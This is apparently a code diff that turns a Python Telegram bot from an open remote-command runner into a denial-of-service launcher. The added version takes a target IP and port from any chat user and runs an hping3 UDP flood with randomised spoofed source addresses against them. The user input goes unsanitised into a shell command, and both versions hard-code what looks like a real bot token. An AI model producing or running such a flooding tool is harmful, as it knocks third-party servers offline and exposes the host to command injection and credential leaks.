@@ -1,105 +1,57 @@
-import telebot
 import subprocess
-import shlex
-import os
-import re
+import telebot
+from telebot import types
 
-# Replace 'YOUR_TOKEN' with your actual bot token obtained from BotFather
-TOKEN = '6306399777:AAGO0tUcRAL_jbApX45y8VwBqCCQ6gXa5uw'
+# Replace 'YOUR_TOKEN' with your actual bot token
+API_TOKEN = '6306399777:AAGO0tUcRAL_jbApX45y8VwBqCCQ6gXa5uw'
+bot = telebot.TeleBot(API_TOKEN)
 
-# Create bot object
-bot = telebot.TeleBot(TOKEN)
+# State to track conversation
+user_state = {}
 
-# Dictionary to store command history per user
-command_history = {}
-
-# Function to execute shell commands securely
-def execute_command(command):
+# Function to install hping3
+def install_hping3():
     try:
-        # Split the command safely using shlex
-        cmd_parts = shlex.split(command)
-        
-        # Execute the command securely
-        result = subprocess.run(cmd_parts, capture_output=True, text=True, timeout=30)  # Timeout set to 30 seconds
-        
-        # Return the command output
-        return result.stdout.strip()
+        subprocess.run("apt-get update && apt-get install -y hping3", shell=True, check=True)
+        print("hping3 installed successfully.")
     except subprocess.CalledProcessError as e:
-        return f"Command failed with return code {e.returncode}. Output:\n{e.output.strip()}"
-    except subprocess.TimeoutExpired:
-        return "Command execution timed out."
-    except Exception as e:
-        return f"Error: {str(e)}"
+        print(f"An error occurred during installation: {e}")
 
-# Function to send long messages in chunks
-def send_long_message(chat_id, text):
-    max_message_length = 3000  # Telegram message length limit
-    for i in range(0, len(text), max_message_length):
-        bot.send_message(chat_id, text[i:i+max_message_length])
-
-# Handler for /start command
 @bot.message_handler(commands=['start'])
-def handle_start(message):
-    bot.send_message(message.chat.id, "Hi! I'm your bot. Send me a command to execute on the server.")
+def start(message):
+    bot.reply_to(message, 'Welcome! Please enter the IP address of the server:')
+    user_state[message.chat.id] = {'step': 'ip'}
 
-# Handler for /exec command
-@bot.message_handler(commands=['exec'])
-def handle_execute(message):
-    # Get the command sent by the user
-    command = message.text.split(' ', 1)[1]
+@bot.message_handler(func=lambda message: message.chat.id in user_state and user_state[message.chat.id]['step'] == 'ip')
+def get_ip(message):
+    user_state[message.chat.id]['ip'] = message.text
+    bot.reply_to(message, f"IP received: {message.text}. Now enter the port:")
+    user_state[message.chat.id]['step'] = 'port'
+
+@bot.message_handler(func=lambda message: message.chat.id in user_state and user_state[message.chat.id]['step'] == 'port')
+def get_port(message):
+    user_state[message.chat.id]['port'] = message.text
+    ip = user_state[message.chat.id]['ip']
+    port = user_state[message.chat.id]['port']
     
-    # Execute the command securely
-    output = execute_command(command)
+    bot.reply_to(message, f"Starting hping3 on {ip}:{port}...")
     
-    # Store command in history
-    user_id = message.from_user.id
-    if user_id not in command_history:
-        command_history[user_id] = []
-    command_history[user_id].append(f"Command: {command}\nOutput:\n{output}")
+    command = f"hping3 -2 -c 1000000 -d 1024 -p {port} --flood --rand-source {ip}"
+    try:
+        subprocess.run(command, shell=True, check=True)
+        bot.reply_to(message, "Command executed successfully!")
+    except subprocess.CalledProcessError as e:
+        bot.reply_to(message, f"An error occurred: {e}")
     
-    # Send the output of the command back to the user
-    if len(output) <= 4096:
-        bot.send_message(message.chat.id, f"Command: `{command}`\nOutput:\n```\n{output}\n```", parse_mode='Markdown')
-    else:
-        bot.send_document(message.chat.id, data=output.encode('utf-8'), caption=f"Command: `{command}`", parse_mode='Markdown')
+    # Clear the state
+    user_state.pop(message.chat.id, None)
 
-# Handler for /history command
-@bot.message_handler(commands=['history'])
-def handle_history(message):
-    send_command_history(message.chat.id, message.from_user.id)
+@bot.message_handler(commands=['cancel'])
+def cancel(message):
+    if message.chat.id in user_state:
+        user_state.pop(message.chat.id, None)
+        bot.reply_to(message, 'Operation cancelled.')
 
-# Inline keyboard pagination for command history
-@bot.callback_query_handler(func=lambda call: call.data.startswith('page'))
-def callback_paging(call):
-    user_id = call.from_user.id
-    if user_id in command_history:
-        history = command_history[user_id]
-        if history:
-            page_number = int(call.data.split('_')[1])
-            start_index = (page_number - 1) * 5
-            end_index = start_index + 5
-            page_commands = history[start_index:end_index]
-            send_long_message(call.message.chat.id, "\n".join(page_commands))
-        else:
-            bot.send_message(call.message.chat.id, "Command history is empty.")
-    else:
-        bot.send_message(call.message.chat.id, "Command history is empty.")
-
-# Function to send command history in chunks
-def send_command_history(chat_id, user_id):
-    if user_id in command_history:
-        history = command_history[user_id]
-        if history:
-            send_long_message(chat_id, "Command History:\n" + "\n".join(history))
-        else:
-            bot.send_message(chat_id, "Command history is empty.")
-    else:
-        bot.send_message(chat_id, "Command history is empty.")
-
-# Error handling
-@bot.message_handler(func=lambda message: True)
-def handle_invalid(message):
-    bot.send_message(message.chat.id, "Invalid command. Please use /exec <command> to execute a command.")
-
-# Polling loop
-bot.polling()
+if __name__ == '__main__':
+    install_hping3()
+    bot.polling()
